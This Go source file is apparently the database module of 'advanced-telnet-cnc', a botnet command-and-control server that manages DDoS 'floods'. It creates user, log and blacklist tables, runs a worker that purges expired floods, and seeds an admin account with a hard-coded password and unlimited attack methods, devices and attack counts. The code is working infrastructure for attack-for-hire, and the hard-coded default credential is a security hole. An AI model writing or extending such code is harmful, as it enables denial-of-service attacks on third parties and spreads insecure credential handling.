package database

import (
	"advanced-telnet-cnc/source/config"
	"database/sql"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

var Instance *sql.DB

func Worker() {
	for {
		floods, err := Floods()
		if err != nil {
			continue
		}

		for _, flood := range floods {
			if time.Now().Truncate(24 * time.Hour).After(flood.End) {
				err := flood.Remove()
				if err != nil {
					continue
				}
			}
		}

		time.Sleep(15 * time.Second)
	}
}
func Serve() {
	conn, err := sql.Open("sqlite3", "assets/cnc.sqlite")
	if err != nil {
		config.Logger.Fatal("Opening the database failed!", "err", err)
	}

	Instance = conn

	err = CreateUserTable()
	if err != nil {
		config.Logger.Fatal("UserProfile table creation failed!", "err", err)
	}

	err = CreateLogsTable()
	if err != nil {
		config.Logger.Fatal("Logs table creation failed!", "err", err)
	}

	err = CreateBlacklistTable()
	if err != nil {
		config.Logger.Fatal("Blacklist table creation failed!", "err", err)
	}

	err = CreateUser(&UserProfile{
		Name:       "admin",
		Password:   "chocolate_nya",
		Methods:    []int{-1},
		MaxTime:    300,
		MaxAttacks: 100,
		Cooldown:   0,
		Devices:    -1,
		Expiry:     time.Now().Add(99999 * time.Hour),
		Admin:      true,
	}, true)

	go Worker()

	config.Logger.Info("SQLite3 database opened successfully.")
}
